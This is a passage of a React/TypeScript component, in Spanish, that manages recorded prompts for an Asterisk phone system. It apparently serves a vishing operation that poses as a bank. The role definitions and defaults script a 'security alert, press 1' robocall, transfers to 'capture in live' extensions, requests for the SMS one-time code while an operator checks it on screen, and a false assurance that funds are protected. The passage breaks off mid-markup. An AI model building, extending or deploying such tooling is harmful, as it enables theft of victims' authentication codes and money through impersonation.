import React, { useState, useRef, useEffect } from 'react';
import { AudioPrompt, AudioRole, ActiveAudioAssignments } from '../types';
import {
  UploadCloud,
  Play,
  Pause,
  Trash2,
  CheckCircle,
  Volume2,
  Mic,
  Square,
  Sparkles,
  Info,
  Copy,
  FolderSync,
  Radio,
  Headphones,
  PhoneCall,
  PhoneForwarded,
  ShieldAlert,
  CheckCircle2,
  AlertTriangle,
  RotateCcw,
  Sliders,
  ArrowRight,
  RefreshCw,
  Save,
  Lock,
  PowerOff,
  Check,
} from 'lucide-react';

interface AudioLibraryTabProps {
  audios: AudioPrompt[];
  onAddAudio: (audio: AudioPrompt) => void;
  onDeleteAudio: (id: string) => void;
  onAssignToPress1: (audioId: string) => void;
  onAssignToOtp: (audioId: string) => void;
  onAssignToAgentTransfer?: (audioId: string) => void;
  onAssignTo7777?: (audioId: string) => void;
  onAssignTo6666?: (audioId: string) => void;
  onAssignTo5555?: (audioId: string) => void;
  onAssignTo4444?: (audioId: string) => void;
  onAssignTo3333?: (audioId: string) => void;
  activeAssignments?: ActiveAudioAssignments;
  onAssignRole?: (role: AudioRole, asteriskPath: string) => void;
}

interface RoleConfig {
  role: AudioRole;
  title: string;
  badge: string;
  badgeColor: string;
  category: 'press1' | 'otp';
  icon: React.ComponentType<{ className?: string }>;
  description: string;
  astDbKey: string;
  fallbackDefault: string;
}

const SYSTEM_ROLES: RoleConfig[] = [
  {
    role: 'welcome_7777',
    title: 'Bienvenida Extensión 7777 (Captura en Vivo)',
    badge: 'Extensión 7777',
    badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 7777 para capturar el código OTP.',
    astDbKey: 'ivr_vars 7777_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_6666',
    title: 'Bienvenida Extensión 6666 (Captura en Vivo)',
    badge: 'Extensión 6666',
    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 6666 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 6666_intro',
    fallbackDefault: 'custom/bienvenida_6666',
  },
  {
    role: 'welcome_5555',
    title: 'Bienvenida Extensión 5555 (Captura en Vivo)',
    badge: 'Extensión 5555',
    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 5555 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 5555_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_4444',
    title: 'Bienvenida Extensión 4444 (Captura en Vivo)',
    badge: 'Extensión 4444',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 4444 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 4444_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'welcome_3333',
    title: 'Bienvenida Extensión 3333 (Captura en Vivo)',
    badge: 'Extensión 3333',
    badgeColor: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
    category: 'otp',
    icon: Headphones,
    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 3333 para capturar el código OTP con locución independiente.',
    astDbKey: 'ivr_vars 3333_intro',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'press1_welcome',
    title: 'Bienvenida IVR Press 1 (Llamada Inicial)',
    badge: 'Campaña Press 1',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'press1',
    icon: PhoneCall,
    description: 'Audio principal reproducido al contactar al cliente ("Alerta de seguridad, marque 1 para comunicarse con un asesor...").',
    astDbKey: 'ivr_vars default_intro',
    fallbackDefault: 'custom/bienvenida_corporativa',
  },
  {
    role: 'agent_transfer',
    title: 'Transferencia a Asesor (Al Presionar 1)',
    badge: 'Opción 1 Asesor',
    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
    category: 'press1',
    icon: PhoneForwarded,
    description: 'Audio de transición que escucha el cliente al presionar la tecla 1 ("Un momento, le estamos comunicando con un asesor...").',
    astDbKey: 'ivr_vars default_agent',
    fallbackDefault: 'custom/conectar_asesor_banco',
  },
  {
    role: 'press1_invalid',
    title: 'Opción Inválida en Menú Press 1',
    badge: 'Opción Inválida',
    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    category: 'press1',
    icon: AlertTriangle,
    description: 'Audio reproducido cuando el cliente presiona una tecla distinta a 1 o se agota el tiempo sin marcar ("Opción no válida...").',
    astDbKey: 'ivr_vars default_invalid',
    fallbackDefault: 'custom/opcion_invalida',
  },
  {
    role: 'otp_welcome',
    title: 'Solicitud de Código OTP / Token',
    badge: 'Captura de Código',
    badgeColor: 'bg-blue-500/20 text-blue-300 border-blue-500/30',
    category: 'otp',
    icon: ShieldAlert,
    description: 'Audio pidiéndole al cliente ingresar su código de seguridad ("Por favor ingrese el código de 6 dígitos que recibió por SMS...").',
    astDbKey: 'ivr_vars default_prompt',
    fallbackDefault: 'custom/solicitar_codigo_otp',
  },
  {
    role: 'otp_wait',
    title: 'Validación en Curso (Espera al Cliente)',
    badge: 'Validación en Espera',
    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    category: 'otp',
    icon: RotateCcw,
    description: 'Audio o música en bucle mientras el asesor verifica el código en su pantalla ("Un momento por favor, estamos validando su información...").',
    astDbKey: 'ivr_vars default_wait',
    fallbackDefault: 'custom/un_momento_validando_informacion',
  },
  {
    role: 'otp_success',
    title: 'Código Aprobado / Éxito de Seguridad',
    badge: 'Validación Exitosa',
    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
    category: 'otp',
    icon: CheckCircle2,
    description: 'Audio final cuando el código es correcto ("Su operación ha sido asegurada y sus fondos están protegidos con éxito.").',
    astDbKey: 'ivr_vars default_success',
    fallbackDefault: 'custom/operacion_bloqueada_exito',
  },
  {
    role: 'otp_failure',
    title: 'Código Inválido / Reintentar Dígitos',
    badge: 'Código Inválido',
    badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    category: 'otp',
    icon: AlertTriangle,
    description: 'Audio cuando el asesor marca el código como inválido ("El código ingresado no es correcto, por favor vuelva a ingresarlo.").',
    astDbKey: 'ivr_vars default_failure',
    fallbackDefault: 'custom/token_invalido_reintente',
  },
];

export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
  audios,
  onAddAudio,
  onDeleteAudio,
  onAssignToPress1,
  onAssignToOtp,
  onAssignToAgentTransfer,
  onAssignTo7777,
  onAssignTo6666,
  onAssignTo5555,
  onAssignTo4444,
  onAssignTo3333,
  activeAssignments: propActiveAssignments,
  onAssignRole,
}) => {
  const [playingAudioId, setPlayingAudioId] = useState<string | null>(null);
  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);

  // Active assignments state
  const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
    propActiveAssignments || {
      press1_welcome: 'custom/bienvenida_corporativa',
      agent_transfer: 'custom/conectar_asesor_banco',
      press1_invalid: 'custom/opcion_invalida',
      welcome_7777: 'custom/solicitar_codigo_otp',
      welcome_6666: 'custom/bienvenida_6666',
      welcome_5555: 'custom/solicitar_codigo_otp',
      welcome_4444: 'custom/solicitar_codigo_otp',
      welcome_3333: 'custom/solicitar_codigo_otp',
      otp_welcome: 'custom/solicitar_codigo_otp',
      otp_wait: 'custom/un_momento_validando_informacion',
      otp_success: 'custom/operacion_bloqueada_exito',
      otp_failure: 'custom/token_invalido_reintente',
    }
  );

  const [isSyncingRole, setIsSyncingRole] = useState<Record<string, boolean>>({});
  const [feedbackMsg, setFeedbackMsg] = useState<{ text: string; type: 'success' | 'info' } | null>(null);
  const [filterCategory, setFilterCategory] = useState<'all' | 'press1' | 'otp'>('all');

  // Fetch active audio assignments on mount
  const fetchActiveAssignments = async () => {
    try {
      const res = await fetch('/api/asterisk/audio/active-assignments');
      const data = await res.json();
      if (data.success && data.assignments) {
        setActiveAssignments(data.assignments);
      }
    } catch (e) {
      console.warn('Error al obtener asignaciones activas de audio:', e);
    }
  };

  useEffect(() => {
    fetchActiveAssignments();
  }, []);

  useEffect(() => {
    if (propActiveAssignments) {
      setActiveAssignments(propActiveAssignments);
    }
  }, [propActiveAssignments]);

  const handleAssignRoleDirect = async (role: AudioRole, asteriskPath: string) => {
    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
    try {
      const res = await fetch('/api/asterisk/audio/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role, asteriskPath }),
      });
      const data = await res.json();
      if (data.success) {
        setActiveAssignments((prev) => ({
          ...prev,
          ...(data.assignments || { [role]: asteriskPath }),
        }));
        onAssignRole?.(role, asteriskPath);

        const roleConfig = SYSTEM_ROLES.find((r) => r.role === role);
        setFeedbackMsg({
          text: `¡${roleConfig?.title || role} actualizado a "${asteriskPath}" en Asterisk AstDB!`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 4500);
      }
    } catch (e) {
      console.error('Error assigning audio role:', e);
      setFeedbackMsg({
        text: `Error al actualizar ${role} en Asterisk. Verifica la conexión con el servidor.`,
        type: 'info',
      });
      setTimeout(() => setFeedbackMsg(null), 4500);
    } finally {
      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
    }
  };

  // Handler to deactivate / unassign an audio from a role
  const handleDeactivateRole = async (role: AudioRole) => {
    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
    try {
      const res = await fetch('/api/asterisk/audio/unassign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role }),
      });
      const data = await res.json();
      if (data.success && data.assignments) {
        setActiveAssignments(data.assignments);
        setFeedbackMsg({
          text: `Audio desactivado para "${role}". Restaurado a locución por defecto.`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 4000);
      }
    } catch (err) {
      console.error('Error al desactivar audio:', err);
    } finally {
      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
    }
  };

  // Handler to permanently save and lock 7777, 6666, 5555, 4444 and 3333 configuration
  const [isSavingOtpExtensions, setIsSavingOtpExtensions] = useState(false);
  const [otpExtensionsSaved, setOtpExtensionsSaved] = useState(false);

  const handleSaveOtpExtensions = async () => {
    setIsSavingOtpExtensions(true);
    try {
      const res = await fetch('/api/asterisk/audio/save-otp-extensions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          welcome_7777: activeAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
          welcome_6666: activeAssignments.welcome_6666 || 'custom/bienvenida_6666',
          welcome_5555: activeAssignments.welcome_5555 || 'custom/solicitar_codigo_otp',
          welcome_4444: activeAssignments.welcome_4444 || 'custom/solicitar_codigo_otp',
          welcome_3333: activeAssignments.welcome_3333 || 'custom/solicitar_codigo_otp',
        }),
      });
      const data = await res.json();
      if (data.success) {
        setOtpExtensionsSaved(true);
        setFeedbackMsg({
          text: '✓ Configuración de extensiones 7777, 6666, 5555, 4444 y 3333 guardada y bloqueada en AstDB. No cambiará al actualizar el sistema.',
          type: 'success',
        });
        setTimeout(() => {
          setOtpExtensionsSaved(false);
          setFeedbackMsg(null);
        }, 4500);
      }
    } catch (err: any) {
      setFeedbackMsg({
        text: `Error al guardar: ${err.message}`,
        type: 'info',
      });
    } finally {
      setIsSavingOtpExtensions(false);
    }
  };

  // Featured Extensions View State (7777, 6666, 5555, 4444, 3333)
  const [featuredExtTab, setFeaturedExtTab] = useState<'all' | '7777' | '6666' | '5555' | '4444' | '3333'>('all');

  // Upload modal state
  const [isDragging, setIsDragging] = useState(false);
  const [isUploadModalOpen, setIsUploadModalOpen] = useState(false);
  const [newAudioName, setNewAudioName] = useState('');
  const [newAudioCategory, setNewAudioCategory] = useState<AudioPrompt['category']>('welcome_7777');
  const [stagedFileDataUrl, setStagedFileDataUrl] = useState<string | null>(null);
  const [stagedFileName, setStagedFileName] = useState('');
  const [stagedFileSize, setStagedFileSize] = useState('');
  const [stagedDuration, setStagedDuration] = useState(4.0);
  const [autoActivateRole, setAutoActivateRole] = useState(true);

  // Live Microphone Recording state
  const [isRecording, setIsRecording] = useState(false);
  const [recordingTime, setRecordingTime] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordingTimerRef = useRef<any>(null);

  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const ext7777FileInputRef = useRef<HTMLInputElement | null>(null);
  const ext6666FileInputRef = useRef<HTMLInputElement | null>(null);
  const ext5555FileInputRef = useRef<HTMLInputElement | null>(null);
  const ext4444FileInputRef = useRef<HTMLInputElement | null>(null);
  const ext3333FileInputRef = useRef<HTMLInputElement | null>(null);

  const [isUploading7777, setIsUploading7777] = useState(false);
  const [isUploading6666, setIsUploading6666] = useState(false);
  const [isUploading5555, setIsUploading5555] = useState(false);
  const [isUploading4444, setIsUploading4444] = useState(false);
  const [isUploading3333, setIsUploading3333] = useState(false);

  const handleUpload7777Direct = async (file: File) => {
    if (!file) return;
    setIsUploading7777(true);
    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_7777';
      const cleanPath = `custom/${baseName}`;

      const newAudioItem: AudioPrompt = {
        id: `audio-7777-${Date.now()}`,
        name: `Extensión 7777: ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: 'welcome_7777',
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: 'welcome_7777',
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect('welcome_7777', cleanPath);
        if (onAssignTo7777) {
          onAssignTo7777(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `¡Audio para la Extensión 7777 cargado y activo con éxito en Asterisk! Al transferir a la 7777 o 777 se reproducirá de inmediato.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error('Error subiendo audio 7777:', err);
        setFeedbackMsg({
          text: `Error al subir el audio para la 7777: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setIsUploading7777(false);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleUpload6666Direct = async (file: File) => {
    if (!file) return;
    setIsUploading6666(true);
    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_6666';
      const cleanPath = `custom/${baseName}`;

      const newAudioItem: AudioPrompt = {
        id: `audio-6666-${Date.now()}`,
        name: `Extensión 6666: ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: 'welcome_6666',
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: 'welcome_6666',
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect('welcome_6666', cleanPath);
        if (onAssignTo6666) {
          onAssignTo6666(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `¡Audio para la Extensión 6666 cargado y activo con éxito en Asterisk! Al transferir a la 6666 o 666 se reproducirá de inmediato.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error('Error subiendo audio 6666:', err);
        setFeedbackMsg({
          text: `Error al subir el audio para la 6666: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setIsUploading6666(false);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleUpload5555Direct = async (file: File) => {
    if (!file) return;
    setIsUploading5555(true);
    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_5555';
      const cleanPath = `custom/${baseName}`;

      const newAudioItem: AudioPrompt = {
        id: `audio-5555-${Date.now()}`,
        name: `Extensión 5555: ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: 'welcome_5555',
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: 'welcome_5555',
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect('welcome_5555', cleanPath);
        if (onAssignTo5555) {
          onAssignTo5555(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `¡Audio para la Extensión 5555 cargado y activo con éxito en Asterisk! Al transferir a la 5555 o 555 se reproducirá de inmediato.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error('Error subiendo audio 5555:', err);
        setFeedbackMsg({
          text: `Error al subir el audio para la 5555: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setIsUploading5555(false);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleUpload4444Direct = async (file: File) => {
    if (!file) return;
    setIsUploading4444(true);
    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_4444';
      const cleanPath = `custom/${baseName}`;

      const newAudioItem: AudioPrompt = {
        id: `audio-4444-${Date.now()}`,
        name: `Extensión 4444: ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: 'welcome_4444',
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: 'welcome_4444',
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect('welcome_4444', cleanPath);
        if (onAssignTo4444) {
          onAssignTo4444(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `¡Audio para la Extensión 4444 cargado y activo con éxito en Asterisk! Al transferir a la 4444 o 444 se reproducirá de inmediato.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error('Error subiendo audio 4444:', err);
        setFeedbackMsg({
          text: `Error al subir el audio para la 4444: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setIsUploading4444(false);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleUpload3333Direct = async (file: File) => {
    if (!file) return;
    setIsUploading3333(true);
    const reader = new FileReader();
    reader.onload = async (e) => {
      const dataUrl = e.target?.result as string;
      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_3333';
      const cleanPath = `custom/${baseName}`;

      const newAudioItem: AudioPrompt = {
        id: `audio-3333-${Date.now()}`,
        name: `Extensión 3333: ${file.name.replace(/\.[^/.]+$/, '')}`,
        category: 'welcome_3333',
        fileName: `${baseName}.wav`,
        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
        durationSec: 5.5,
        format: 'WAV',
        sampleRate: '8000Hz PCM 16-bit Mono',
        dataUrl: dataUrl,
        asteriskPath: cleanPath,
        createdAt: new Date().toISOString(),
      };

      onAddAudio(newAudioItem);

      try {
        await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudioItem.name,
            fileName: `${baseName}.wav`,
            category: 'welcome_3333',
            dataUrl: dataUrl,
          }),
        });

        await handleAssignRoleDirect('welcome_3333', cleanPath);
        if (onAssignTo3333) {
          onAssignTo3333(newAudioItem.id);
        }

        setFeedbackMsg({
          text: `¡Audio para la Extensión 3333 cargado y activo con éxito en Asterisk! Al transferir a la 3333 o 333 se reproducirá de inmediato.`,
          type: 'success',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } catch (err: any) {
        console.error('Error subiendo audio 3333:', err);
        setFeedbackMsg({
          text: `Error al subir el audio para la 3333: ${err.message}`,
          type: 'info',
        });
        setTimeout(() => setFeedbackMsg(null), 5000);
      } finally {
        setIsUploading3333(false);
      }
    };
    reader.readAsDataURL(file);
  };

  const categoryLabels: Record<AudioPrompt['category'], { label: string; color: string }> = {
    welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
    welcome_6666: { label: 'Bienvenida Extensión 6666', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20 font-bold' },
    welcome_5555: { label: 'Bienvenida Extensión 5555', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20 font-bold' },
    welcome_4444: { label: 'Bienvenida Extensión 4444', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20 font-bold' },
    welcome_3333: { label: 'Bienvenida Extensión 3333', color: 'text-pink-400 bg-pink-500/10 border-pink-500/20 font-bold' },
    press1_welcome: { label: 'IVR Bienvenida Press 1', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
    press1_invalid: { label: 'IVR Opción Inválida', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
    agent_transfer: { label: 'Transferencia Asesor (Opción 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
    otp_welcome: { label: 'Captura OTP Instrucción', color: 'text-blue-400 bg-blue-500/10 border-blue-500/20' },
    otp_wait: { label: 'Validación en Espera', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
    otp_success: { label: 'OTP Validación Exitosa', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
    otp_failure: { label: 'OTP Error o Expirado', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
    hold_music: { label: 'Música de Espera (MOH)', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20' },
    custom: { label: 'Anuncio Personalizado', color: 'text-slate-300 bg-slate-800 border-slate-700' },
  };

  const handlePlayToggle = (audio: AudioPrompt) => {
    if (playingAudioId === audio.id) {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      setPlayingAudioId(null);
    } else {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      const player = new Audio(audio.dataUrl);
      audioPlayerRef.current = player;
      setPlayingAudioId(audio.id);
      player.play().catch((err) => console.error('Audio play error:', err));
      player.onended = () => {
        setPlayingAudioId(null);
      };
    }
  };

  const handlePlayByPath = (asteriskPath: string) => {
    const clean = asteriskPath.replace(/\.wav$/, '');
    const match = audios.find((a) => a.asteriskPath === clean || a.asteriskPath === `custom/${clean.replace(/^custom\//, '')}`);
    if (match) {
      handlePlayToggle(match);
    } else {
      setFeedbackMsg({
        text: `Audio "${asteriskPath}" está configurado en el servidor Asterisk.`,
        type: 'info',
      });
      setTimeout(() => setFeedbackMsg(null), 3500);
    }
  };

  const processFile = (file: File, preselectedCategory?: AudioPrompt['category']) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      const dataUrl = e.target?.result as string;
      setStagedFileDataUrl(dataUrl);
      setStagedFileName(file.name);
      setStagedFileSize(`${(file.size / 1024).toFixed(1)} KB`);

      const tempAudio = new Audio(dataUrl);
      tempAudio.onloadedmetadata = () => {
        const dur = Math.round(tempAudio.duration * 10) / 10 || 5.0;
        setStagedDuration(dur);
      };

      if (!newAudioName) {
        const cleanName = file.name.replace(/\.[^/.]+$/, '').replace(/[_-]/g, ' ');
        setNewAudioName(cleanName.charAt(0).toUpperCase() + cleanName.slice(1));
      }
      if (preselectedCategory) {
        setNewAudioCategory(preselectedCategory);
      }
      setIsUploadModalOpen(true);
    };
    reader.readAsDataURL(file);
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files[0]) {
      processFile(files[0]);
    }
  };

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const files = e.dataTransfer.files;
    if (files && files[0]) {
      processFile(files[0]);
    }
  };

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioChunksRef.current = [];
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = (e) => {
          const dataUrl = e.target?.result as string;
          const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
          const fileName = `grabacion_mic_${timestamp}.wav`;
          setStagedFileDataUrl(dataUrl);
          setStagedFileName(fileName);
          setStagedFileSize(`${(audioBlob.size / 1024).toFixed(1)} KB`);
          setStagedDuration(recordingTime);
          setNewAudioName(`Locución en vivo (${recordingTime}s)`);
          setIsUploadModalOpen(true);
        };
        reader.readAsDataURL(audioBlob);

        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start();
      setIsRecording(true);
      setRecordingTime(0);

      recordingTimerRef.current = setInterval(() => {
        setRecordingTime((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      alert('No se pudo acceder al micrófono para grabar. Verifica los permisos.');
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecording) {
      mediaRecorderRef.current.stop();
      setIsRecording(false);
      if (recordingTimerRef.current) {
        clearInterval(recordingTimerRef.current);
      }
    }
  };

  const handleSaveAudio = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!stagedFileDataUrl) return;

    const baseName = stagedFileName
      .replace(/\.[^/.]+$/, '')
      .toLowerCase()
      .replace(/[^a-z0-9_]/g, '_');

    const cleanPath = `custom/${baseName}`;

    const newAudio: AudioPrompt = {
      id: `audio-${Date.now()}`,
      name: newAudioName || stagedFileName,
      category: newAudioCategory,
      fileName: `${baseName}.wav`,
      fileSize: stagedFileSize,
      durationSec: stagedDuration,
      format: 'WAV',
      sampleRate: '8000Hz PCM 16-bit Mono',
      dataUrl: stagedFileDataUrl,
      asteriskPath: cleanPath,
      createdAt: new Date().toISOString(),
    };

    onAddAudio(newAudio);

    // Save to backend filesystem
    try {
      const res = await fetch('/api/asterisk/audio/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          dataUrl: stagedFileDataUrl,
          fileName: `${baseName}.wav`,
          category: newAudioCategory,
        }),
      });
      const data = await res.json();
      if (data.success) {
        console.log('[AUDIO SAVED TO DISK]', data);
      }
    } catch (err) {
      console.warn('Backend audio save error:', err);
    }

    // Auto-activate as live audio in Asterisk if requested
    if (autoActivateRole && newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music') {
      handleAssignRoleDirect(newAudioCategory as AudioRole, cleanPath);
    }

    setIsUploadModalOpen(false);
    setStagedFileDataUrl(null);
    setStagedFileName('');
    setNewAudioName('');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setFeedbackMsg({
      text: `Comando copiado al portapapeles: "${text}"`,
      type: 'info',
    });
    setTimeout(() => setFeedbackMsg(null), 3000);
  };

  const filteredRoles = SYSTEM_ROLES.filter((r) => {
    if (filterCategory === 'all') return true;
    return r.category === filterCategory;
  });

  return (
    <div className="space-y-6">
      {/* Header and overview */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
            <Volume2 className="w-6 h-6 text-emerald-400" />
            <span>Gestor de Mensajes Pregrabados del Sistema</span>
            <span className="text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono">
              {audios.length} audios
            </span>
          </h2>
